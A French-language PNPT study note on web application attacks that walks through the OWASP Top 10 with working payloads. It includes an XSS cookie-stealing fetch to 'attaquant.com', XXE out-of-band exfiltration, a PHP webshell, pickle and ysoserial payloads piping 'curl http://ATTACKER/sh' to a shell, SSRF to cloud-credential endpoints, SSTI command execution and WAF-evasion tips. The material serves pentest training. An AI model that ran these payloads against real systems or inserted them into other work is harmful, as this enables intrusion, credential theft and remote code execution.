---
title: "Web Application Security Basics (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, web, owasp, pnpt]
date: "2026-05-18"
---

# Web Application Security Basics

Le web est aujourd'hui le premier vecteur d'accès initial — bien avant le phishing dans les statistiques de pentest externe. Quel que soit le scope (externe, interne, AD), il y a toujours **une** application web exposée qui peut servir de tremplin. Cette note couvre l'OWASP Top 10 avec, pour chaque vuln, le réflexe de test et les payloads de base.

## Le modèle d'une attaque web

```
   Client (navigateur)              Serveur (application)              Backend
   ─────────────────                ────────────────────                ───────
        │                                  │                              │
        │  GET /page?id=1                  │                              │
        │ ─────────────────────────►       │                              │
        │                                  │  SELECT * FROM users         │
        │                                  │  WHERE id = '1'              │
        │                                  │ ────────────────────►        │
        │                                  │                              │
        │                                  │  ◄────────── résultat        │
        │  ◄─────────── page rendue        │                              │
        │                                  │                              │
        │                                                                 │
        │  Surfaces d'attaque :                                          │
        │   - paramètres URL (?id=)                                       │
        │   - body POST                                                   │
        │   - cookies, headers                                            │
        │   - fichiers uploadés                                           │
        │   - JSON / XML body                                             │
        └─────────────────────────────────────────────────────────────────┘
```

À chaque flèche, demander : "que se passe-t-il si je modifie ce qui passe ?". C'est ça, le réflexe pentest web.

## OWASP Top 10 (2021)

| #  | Vulnérabilité                          | Idée centrale                              |
|----|----------------------------------------|--------------------------------------------|
| 1  | Broken Access Control                  | Accéder à ce qui n'est pas pour soi        |
| 2  | Cryptographic Failures                 | Données sensibles mal protégées            |
| 3  | Injection (SQLi, XSS, Cmd Inj.)        | Données utilisateur non validées           |
| 4  | Insecure Design                        | Défauts de conception (pas d'implémentation)|
| 5  | Security Misconfiguration              | Configs par défaut, services exposés       |
| 6  | Vulnerable Components                  | Librairies obsolètes                       |
| 7  | Authentication Failures                | Auth faible ou cassée                      |
| 8  | Software/Data Integrity Failures       | Mises à jour non vérifiées, CI/CD           |
| 9  | Logging & Monitoring Failures          | Manque de détection                        |
| 10 | Server-Side Request Forgery (SSRF)     | Forcer le serveur à faire des requêtes     |

## SQL Injection

L'injection SQL reste la vulnérabilité la plus classique et la plus impactante (lecture de bases entières, parfois RCE).

```
   Requête vulnérable côté serveur :
     "SELECT * FROM users WHERE id = '$id'"

   Si $id = "1' OR '1'='1" :
     "SELECT * FROM users WHERE id = '1' OR '1'='1'"
                                          ▲
                                          la condition devient toujours vraie
                                          → renvoie TOUS les users
```

### Détection rapide

```sql
' OR 1=1--
' OR '1'='1
" OR ""="
' UNION SELECT NULL--
1' AND SLEEP(5)--             -- blind time-based
```

### Exploitation avec SQLMap

```bash
sqlmap -u "http://IP/page?id=1" --dbs                       # lister bases
sqlmap -u "http://IP/page?id=1" -D database --tables         # tables
sqlmap -u "http://IP/page?id=1" -D database -T table --dump  # extraire

# POST
sqlmap -u "http://IP/login" --data="user=admin&pass=test" --dbs

# Avec cookie de session
sqlmap -u "http://IP/page?id=1" --cookie="PHPSESSID=abc123" --dbs

# Shell OS si privilèges suffisants
sqlmap -u "http://IP/page?id=1" --os-shell
```

### Types de SQLi

- **Union-based** : `' UNION SELECT 1,2,3--` — exploite le résultat affiché
- **Error-based** : forcer des erreurs SQL qui révèlent des données dans le message
- **Blind boolean** : `' AND 1=1--` vs `' AND 1=2--` — observe la différence de page
- **Blind time-based** : `' AND SLEEP(5)--` — observe le délai

## Cross-Site Scripting (XSS)

L'XSS exécute du JavaScript dans le navigateur d'une victime, dans le contexte de l'application légitime.

```
Stored XSS : payload sauvegardé en base → exécuté pour CHAQUE visiteur
Reflected  : payload dans l'URL → exécuté pour qui clique sur ton lien
DOM-based  : manipulation client-side, jamais reçu par le serveur
```

### Payloads de test

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
<body onload=alert('XSS')>
javascript:alert('XSS')
```

### Vol de cookies (exemple classique)

```javascript
<script>
fetch('https://attaquant.com/?c=' + document.cookie)
</script>
```

## Command Injection

Quand une entrée utilisateur est concaténée dans une commande shell exécutée côté serveur.

```bash
; whoami           # nouveau commande après ;
| whoami           # pipe
$(whoami)          # substitution
`whoami`           # substitution legacy
&& whoami          # si succès
|| whoami          # si échec
```

```
Exemple :
  Le serveur exécute : ping -c 1 $user_input

  Si $user_input = "8.8.8.8; cat /etc/passwd" :
  ping -c 1 8.8.8.8; cat /etc/passwd
                    ▲
                    le serveur exécute aussi cat
```

## File Inclusion

### LFI (Local File Inclusion)

```
http://IP/page?file=../../../../etc/passwd
http://IP/page?file=../../../../etc/shadow
http://IP/page?file=....//....//etc/passwd     # bypass filtres ../

# Wrappers PHP utiles
http://IP/page?file=php://filter/convert.base64-encode/resource=index.php
                                                                    ▲
                                                       lire le code source PHP en base64
```

### RFI (Remote File Inclusion)

```
http://IP/page?file=http://ATTAQUANT/shell.php
```

Souvent désactivé par défaut (`allow_url_include = Off`) mais à tester.

## File Upload

Si un upload de fichiers existe, tenter de déposer un webshell.

```bash
# Bypass d'extension
shell.php → shell.php5 / .phtml / .phar / .pht
shell.jpg.php / shell.php.jpg (selon le filtre)

# Bypass de Content-Type (modifier dans Burp)
Content-Type: image/jpeg   ← prétendre que le .php est une image

# Bypass via magic bytes
GIF89a;<?php system($_GET['cmd']); ?>
```

```php
# Webshell PHP minimal
<?php system($_GET['cmd']); ?>
```

## XXE (XML External Entity)

Le parseur XML traite des entités définies par l'utilisateur, permettant de lire des fichiers ou de faire des requêtes.

```xml
<!-- Lecture de fichier local -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>

<!-- Blind XXE via DTD externe (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://ATTAQUANT/evil.dtd"> %ext;]>

<!-- evil.dtd hébergé chez l'attaquant -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTAQUANT/?x=%file;'>">
%eval;
%exfil;
```

## SSRF (Server-Side Request Forgery)

Le serveur effectue une requête HTTP vers une URL contrôlée par l'attaquant — permet d'atteindre des services internes invisibles depuis l'extérieur.

```
# Tests basiques
http://cible.com/fetch?url=http://127.0.0.1:8080/admin
http://cible.com/fetch?url=http://localhost/

# Bypass de filtres
http://127.1/
http://0/
http://[::1]/
http://127.0.0.1.nip.io/

# Cloud metadata — JACKPOT (récupère credentials cloud)
http://169.254.169.254/latest/meta-data/iam/security-credentials/    # AWS
http://169.254.169.254/metadata/instance?api-version=2021-02-01      # Azure (header Metadata: true)
http://metadata.google.internal/computeMetadata/v1/                  # GCP

# Schemes alternatifs
file:///etc/passwd
gopher://127.0.0.1:6379/_FLUSHALL     # SSRF → Redis (RCE possible)
dict://127.0.0.1:11211/stats           # SSRF → Memcached
```

## Insecure Deserialization

Quand des données sérialisées (binaires) sont parsées sans validation, on peut injecter des objets malicieux.

```bash
# PHP — chaînes de magic methods (__wakeup, __destruct...)
phpggc Laravel/RCE9 system 'id' -b

# Java — gadget chains
ysoserial CommonsCollections5 'curl http://ATTACKER/sh|sh' > payload.ser

# .NET — formatters dangereux
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e ..."

# Python pickle
import pickle, os
class Exp:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER/sh|sh',))
print(pickle.dumps(Exp()))
```

## IDOR (Insecure Direct Object Reference)

Accès à des objets en manipulant un identifiant qui n'est pas validé contre la session.

```
# Utilisateur 1001 voit sa propre facture
GET /invoice?id=1001

# Test : changer l'ID
GET /invoice?id=1002      ← on voit la facture de quelqu'un d'autre ?
GET /invoice?id=0
GET /invoice?id=-1
GET /api/users/1001/profile → /api/users/1002/profile
```

À tester aussi :
- IDs encodés (base64, UUID prédictible)
- API endpoints non documentés (visibles dans le JS minifié)
- Méthodes HTTP différentes (GET interdit mais PUT/DELETE oui)

## JWT (JSON Web Tokens)

Format : `header.payload.signature` (base64-url). Plusieurs attaques classiques.

```
Header (base64) : { "alg": "HS256", "typ": "JWT" }
Payload (base64): { "user": "alice", "role": "user", "exp": 1750000000 }
Signature       : HMAC-SHA256(header + "." + payload, secret)
```

### Attaques courantes

```bash
# 1. alg: none — beaucoup de libs anciennes l'acceptent
# Modifier header en { "alg": "none" } et retirer la signature

# 2. Confusion RS256 ↔ HS256
# Si on a la clé publique RSA, signer en HS256 avec cette clé comme secret HMAC

# 3. Secret faible (HS256)
hashcat -m 16500 jwt.txt rockyou.txt
jwt_tool token.jwt -C -d wordlist.txt

# 4. Tampering complet
jwt_tool token.jwt -T

# 5. kid (Key ID) injection — path traversal
# { "kid": "../../../dev/null" } puis signer avec une chaîne vide
```

Voir aussi `[[JWT]]` pour le détail.

## SSTI (Server-Side Template Injection)

Le serveur évalue du code template fourni par l'utilisateur.

```
# Détection : envoyer {{7*7}} et voir si renvoie 49
http://cible.com/page?name={{7*7}}

# Jinja2 (Python / Flask)
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Twig (PHP)
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

# Freemarker (Java)
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}

# Outil
tplmap -u 'http://cible.com/page?name=*'
```

## CSRF (Cross-Site Request Forgery)

```html
<!-- Si pas de token CSRF, un site malicieux fait des actions à la place de la victime connectée -->
<form action="https://cible.com/transfer" method="POST">
    <input name="amount" value="1000">
    <input name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

## NoSQL Injection (MongoDB)

```
# Login bypass classique
username[$ne]=&password[$ne]=
{"username": {"$ne": null}, "password": {"$ne": null}}

# Extraction blind
{"username": "admin", "password": {"$regex": "^a"}}
```

## Race Conditions

Outil : **Turbo Intruder** (Burp) ou **race-the-web**. Envoyer N requêtes en parallèle pour casser un check de race (ex. utiliser un coupon plusieurs fois, withdraw plus que le solde).

## Burp Suite — bases

| Fonctionnalité | Usage                              |
|----------------|------------------------------------|
| Proxy          | Intercepter les requêtes           |
| Repeater       | Modifier et rejouer une requête    |
| Intruder       | Brute force / fuzzing automatisé   |
| Decoder        | Encoder/décoder rapidement         |
| Comparer       | Diff entre deux réponses           |

```
# Configurer le navigateur pour passer par Burp
Proxy : 127.0.0.1:8080
# Installer le certificat CA de Burp pour HTTPS
```

## Énumération web

```bash
# Technologies
whatweb http://IP
# Extension navigateur : Wappalyzer

# Directories et fichiers
gobuster dir -u http://IP -w wordlist -x php,html,txt,bak
feroxbuster -u http://IP -d 3
ffuf -u http://IP/FUZZ -w wordlist

# Sous-domaines / vhosts
gobuster vhost -u http://IP -w wordlist
ffuf -u http://IP -H "Host: FUZZ.cible.com" -w hostnames.txt -fs SIZE_BASELINE

# Fichiers sensibles courants à tester systématiquement
/robots.txt
/.git/
/sitemap.xml
/.env
/wp-config.php.bak
/web.config
/api/swagger.json
/api/docs
```

## Pièges courants

- **WAF (Web Application Firewall)** : bloque les payloads classiques. Encoder, obfusquer, fragmenter. `sqlmap --tamper=between,space2comment`.
- **SQLMap est lent** : commencer ciblé sur un paramètre, pas en aveugle sur toute l'app.
- **XSS bloqué par CSP** : Content-Security-Policy peut empêcher l'exécution. Vérifier le header avant d'investir.
- **Faux positifs sur LFI** : `../../../etc/passwd` peut renvoyer du contenu différent sans être une vraie LFI. Toujours valider avec un fichier dont on connaît le contenu exact.
- **SSRF cloud metadata** : très spécifique au provider (AWS vs Azure vs GCP), avec parfois des protections (IMDSv2 sur AWS nécessite un token).
- **Burp Community vs Pro** : la Community version n'a pas Intruder à pleine vitesse. Pour du fuzzing rapide, préférer ffuf en ligne de commande.
- **Tester `OPTIONS` avant les méthodes HTTP exotiques** : certains endpoints n'acceptent que GET, mais d'autres acceptent PUT/DELETE/PATCH sans contrôle d'accès → IDOR direct.
